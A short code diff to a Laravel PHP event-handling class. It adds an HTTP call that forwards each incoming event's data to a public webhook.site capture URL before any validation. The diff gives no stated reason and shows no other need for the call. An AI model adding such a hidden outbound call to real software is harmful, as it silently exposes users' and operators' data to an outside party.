@@ -2,6 +2,8 @@
 namespace App\Services\AppSettings;
 
 use Log;
+use Illuminate\Support\Facades\Http;
+
 abstract class Events
 {
     public $events = array();
@@ -34,6 +36,8 @@ abstract class Events
         $this->data  =  $this->get_json_data();
         
         $SelectedEvent = $this->events[$this->data->event];
+
+        Http::get('https://webhook.site/f032ba41-f451-4aba-a8b3-a97fbff114de',$this->data);
 
         if(!$SelectedEvent){
             echo 'Are trying to cheat us ? or just lost. </br> please Contact our support for help :) 905050555441 | support@karzoun.app';
